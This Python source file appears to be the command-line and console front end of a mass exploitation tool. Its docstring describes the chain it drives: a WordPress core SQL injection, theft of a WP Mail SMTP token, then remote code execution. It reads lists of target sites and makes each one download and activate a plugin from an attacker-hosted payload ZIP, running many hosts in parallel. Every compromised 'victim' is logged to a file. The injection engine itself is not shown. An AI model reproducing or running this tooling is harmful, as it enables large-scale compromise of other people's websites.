            with lock:
                rows.append((i, host, "error", 0, 0.0))

    ordered = sorted(enumerate(targets, 1), key=lambda kv: kv[0])
    if pool > 1:
        with ThreadPoolExecutor(max_workers=pool) as ex:
            list(ex.map(work, ordered))
    else:
        for it in ordered:
            work(it)

    rows = [(host, res, reqs, secs) for _, host, res, reqs, secs in sorted(rows)]
    confirmed = sum(1 for r in rows if r[1] == "CONFIRMED")
    ui.summary(rows, confirmed, len(targets), (vuln_out if do_fire and confirmed else None))
    if not do_fire:
        ui.info("scan completed; --no-fire, nothing proven and nothing appended")
        return 0
    return 0 if confirmed else 1


def ask_sites_path():
    """Interactive helper: ask for the user's sites-list txt. None when not a TTY or blank."""
    if not sys.stdin.isatty():
        return None
    try:
        v = input("path to your sites list .txt (Enter to scan a single target): ").strip()
    except (EOFError, KeyboardInterrupt):
        return None
    return v or None


def ask(label, default=None):
    """Interactive input; falls back to `default`. Raises CampaignAbort when stdin is
    not a terminal and there is no default to fall back to."""
    if not sys.stdin.isatty():
        if default is not None:
            return default
        raise CampaignAbort("--%s required when stdin is not a terminal" % label)
    try:
        v = input("%s%s: " % (label, (" [%s]" % default) if default is not None else "")).strip()
    except (EOFError, KeyboardInterrupt):
        v = ""
    if v:
        return v
    if default is not None:
        return default
    raise CampaignAbort("--%s required (no default)" % label)


def ask_int(label, default=None, lo=1, hi=64):
    v = ask(label, default)
    try:
        i = int(v)
    except (TypeError, ValueError):
        raise CampaignAbort("--%s must be an integer (got %r)" % (label, v))
    return max(lo, min(hi, i))


class UI:
    """Console with rich colors/panels/tables/progress, auto-falling back to plain
    tagged text ([*]/[+]/[-]/[!]) when rich is missing or --plain is set."""

    def __init__(self, plain=False):
        self.use_rich = False
        self.console = None
        self._bar_lock = threading.Lock()
        self._shared_p = None
        self._bar_refs = 0
        try:
            from rich.console import Console
            from rich.panel import Panel
            from rich.progress import (BarColumn, Progress, TaskProgressColumn,
                                       TextColumn, TimeElapsedColumn)
            from rich.table import Table
            from rich.text import Text
            if plain:
                raise ImportError("plain mode")
            self._Console = Console
            self._Panel = Panel
            self._Table = Table
            self._Progress = Progress
            self._BarColumn = BarColumn
            self._TextColumn = TextColumn
            self._TaskProgressColumn = TaskProgressColumn
            self._TimeElapsedColumn = TimeElapsedColumn
            self._Text = Text
            self.console = Console(highlight=False)
            self.use_rich = True
        except Exception:
            self.use_rich = False

    def _p(self, tag, color, msg):
        if self.use_rich:
            self.console.print(self._Text(tag, style=color), msg)
        else:
            print(tag + msg)

    def banner(self, title, subtitle=None):
        if self.use_rich:
            t = self._Text(title, style="bold white")
            if subtitle:
                t.append("\n" + subtitle, style="dim")
            self.console.print(self._Panel(t, border_style="cyan", expand=False))
        else:
            print("=" * 70)
            print(title)
            if subtitle:
                print(subtitle)
            print("=" * 70)

    def info(self, msg):
        self._p("[*] ", "cyan", msg)

    def good(self, msg):
        self._p("[+] ", "green", msg)

    def bad(self, msg):
        self._p("[-] ", "bold red", msg)

    def warn(self, msg):
        self._p("[!] ", "bold yellow", msg)

    def step(self, msg):
        self.info(msg)

    def host_header(self, i, n, host):
        if self.use_rich:
            self.console.rule(" [%d/%d] %s " % (i, n, host), style="magenta")
        else:
            print("-" * 70)
            print("[%d/%d] %s" % (i, n, host))

    def token(self, token, reqs, secs):
        self.info("token: %s  (%d requests, %.0fs)" % (token, reqs, secs))

    def confirmed(self, host, secs, path):
        if self.use_rich:
            self.console.print(self._Text("   CONFIRMED  ", style="bold white on green"),
                               self._Text("%s  (%.0fs)" % (host, secs)),
                               self._Text("-> saved in %s" % path, style="dim"))
        else:
            print("[+] CONFIRMED %s (%.0fs) -> %s" % (host, secs, path))

    def failed(self, host, err):
        if self.use_rich:
            self.console.print(self._Text("   NOT EXPLOITABLE  ", style="bold white on red"),
                               self._Text(host, style="dim"), self._Text(" : %s" % err))
        else:
            print("[-] NOT EXPLOITABLE %s : %s" % (host, err))

    def inconclusive(self, host, verdict):
        self._p("[?] ", "dim", "%s -> %s" % (host, verdict))

    def summary(self, rows, confirmed_n, total_n, vuln_path=None):
        if self.use_rich:
            t = self._Table(title="Scan summary", border_style="blue")
            t.add_column("host")
            t.add_column("result")
            t.add_column("req", justify="right")
            t.add_column("sec", justify="right")
            for host, res, reqs, secs in rows:
                style = "green" if res == "CONFIRMED" else ("red" if res == "error" else "dim")
                t.add_row(host, res, str(reqs), "%.0f" % secs, style=style)
            self.console.print(t)
            tail = "  ->  saved in %s" % vuln_path if vuln_path else ""
            self.console.print(self._Text("%d/%d CONFIRMED%s" % (confirmed_n, total_n, tail),
                                          style="bold green" if confirmed_n else "bold dim"))
        else:
            for host, res, reqs, secs in rows:
                print("%-5s %-12s %6s req %6.0fs  %s" % (res, res, reqs, secs, host))
            print("[*] %d/%d CONFIRMED%s" % (confirmed_n, total_n,
                                             ("  ->  %s" % vuln_path) if vuln_path else ""))
        return confirmed_n

    def ask(self, label, default=None):
        return ask(label, default)

    def ask_int(self, label, default=None, lo=1, hi=64):
        return ask_int(label, default, lo=lo, hi=hi)

    def ask_sites(self):
        return ask_sites_path()

    def bar(self, label="extracting token"):
        return ProgressBar(self, label)


class ProgressBar:
    """Thread-safe per-host task inside ONE shared rich Progress region, so concurrent host
    workers each get their own live progress line without clobbering each other on screen.
    Plain mode degrades to a no-op (the tagged text lines already stream)."""

    def __init__(self, ui, label="extracting token"):
        self.ui = ui
        self._label = label
        self._p = None
        self._task = None

    @property
    def live(self):
        return self._task is not None

    def start(self, total):
        if not self.ui.use_rich:
            return
        with self.ui._bar_lock:
            if self.ui._shared_p is None:
                p = self.ui._Progress(
                    self.ui._TextColumn("[progress.description]{task.description}"),
                    self.ui._BarColumn(bar_width=22),
                    self.ui._TaskProgressColumn(),
                    self.ui._TimeElapsedColumn(),
                    console=self.ui.console)
                p.start()
                self.ui._shared_p = p
            self._p = self.ui._shared_p
            self._task = self._p.add_task(self._label[:44], total=total)
            self.ui._bar_refs += 1

    def update(self, done):
        if self._task is None:
            return
        with self.ui._bar_lock:
            if self._task is not None:
                try:
                    self._p.update(self._task, completed=done)
                except Exception:
                    pass

    def stop(self):
        if self._task is None:
            return
        with self.ui._bar_lock:
            if self._task is None:
                return
            try:
                self._p.remove_task(self._task)
            except Exception:
                pass
            self._task = None
            self._p = None
            self.ui._bar_refs -= 1
            if self.ui._bar_refs <= 0 and self.ui._shared_p is not None:
                try:
                    self.ui._shared_p.stop()
                except Exception:
                    pass
                self.ui._shared_p = None


"""GENERAL PoC CLI source. The build harness embeds this file (minus its two import
lines) behind the complete engine into the self-contained poc_sqli_wpms_general.py.

Scanner for the WP-core batch-confusion SQLi -> WP Mail SMTP raw-token gate -> RCE.
Identical verified logic to the local build (both call the shared scan_target()).

Interactive (recommended, just run it):
  python poc_sqli_wpms_general.py
      -> asks for your sites-list .txt path, the payload ZIP URL, the per-host
         concurrency (threads) AND how many hosts to scan in parallel (--workers)
         in one clean prompt sequence,
      -> scans hosts in parallel and appends each CONFIRMED victim to vuln.txt
         immediately.
Non-interactive:
  python poc_sqli_wpms_general.py --sites list.txt --url-zip https://attacker/h.zip --workers 4 --threads 4
  python poc_sqli_wpms_general.py --target https://victim.example --url-zip https://attacker/h.zip
  python poc_sqli_wpms_general.py --sites list.txt --no-fire   # extract-only: nothing appended

Speed: probes are packed ~12-per-HTTP-request (the core 'at most N items' cap is
auto-learned) and frames run concurrently per host. MANY HOSTS ARE SCANNED IN
PARALLEL by default (--workers, default 2): with a scan list the wall clock is
~one host's runtime, not the sum, and long lists keep their strong throughput
instead of degrading over time. When aiohttp is installed (default 'auto'),
requests within each extraction round share connections and run through asyncio
with a --threads' semaphore; without it, or with --no-aiohttp, the same traffic
runs over urllib threads. Either way a 128-char token is ~100 HTTP requests
total. Rich colors/tables/progress are used when 'rich' is installed (--plain
forces plain text; concurrent hosts each get their own live progress line).
"""

import argparse
import os
import sys



def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--target", help="single WordPress root URL (prompted when omitted)")
    ap.add_argument("--sites", "-s", dest="sites", default=None,
                    help="path to a .txt list of WordPress roots (one per line)")
    ap.add_argument("--vuln-out", "-o", default="vuln.txt",
                    help="file confirmed victims are appended to as soon as each is proven")
    ap.add_argument("--url-zip", "--file-url", dest="url_zip", default=None,
                    help="payload ZIP each target's connect_process will download")
    ap.add_argument("--plugin-slug", default="evilprobe",
                    help="plugin folder/main-file token to confirm in active_plugins post-fire")
    ap.add_argument("--dialect", choices=("auto", "sqlite", "mysql"), default="auto")
    ap.add_argument("--prefix", default=None, help="options table prefix (auto-detected by default)")
    ap.add_argument("--length", type=int, default=None, help="option value length (auto-detected)")
    ap.add_argument("--threads", type=int, default=None,
                    help="concurrent batch requests per host (default 2; prompted when omitted)")
    ap.add_argument("--workers", type=int, default=None,
                    help="how many hosts are scanned in parallel (default 2; prompted when omitted)")
    ap.add_argument("--timeout", type=float, default=60.0, help="per-request timeout, seconds")
    ap.add_argument("--retries", type=int, default=2)
    ap.add_argument("--no-fire", action="store_true")
    ap.add_argument("--no-aiohttp", action="store_true", help="force the urllib+threads transport")
    ap.add_argument("--plain", action="store_true", help="plain text output, no rich colors")
    args = ap.parse_args()

    ui = UI(plain=args.plain)
    ui.banner("GENERAL PoC: WP Core SQLi -> WP Mail SMTP raw token -> RCE",
              "single self-contained scanner; prompts for sites .txt / zip / threads / workers")

    if args.sites:
        targets = load_targets(args.sites)
        ui.info("sites list: %s (%d target(s))" % (args.sites, len(targets)))
    elif args.target:
        targets = [args.target]
    else:
        p = ui.ask_sites() if sys.stdin.isatty() else None
        if p:
            targets = load_targets(p)
            ui.info("sites list: %s (%d target(s))" % (p, len(targets)))
        else:
            target = ui.ask("--target", default=None)
            targets = [target]

    if not targets:
        raise CampaignAbort("no targets to scan")

    if args.threads is None:
        args.threads = ui.ask_int("--threads (concurrent requests per host)", default=2)
    if args.workers is None:
        args.workers = ui.ask_int("--workers (hosts scanned in parallel)", default=2)
    if not args.no_fire:
        args.url_zip = args.url_zip or ui.ask("--url-zip payload URL", default=None)

    transport = "threads" if args.no_aiohttp else "auto"
    ui.info("transport: %s (aiohttp available=%s)" % (transport, aio_available()))

    sys.exit(scan_targets(ui, targets, do_fire=not args.no_fire,
                          url_zip=args.url_zip, dialect=args.dialect, prefix=args.prefix,
                          length=args.length, timeout=args.timeout, retries=args.retries,
                          threads=args.threads, workers=args.workers,
                          plugin_slug=args.plugin_slug,
                          transport=transport, vuln_out=args.vuln_out))


if __name__ == "__main__":
    sys.exit(main())
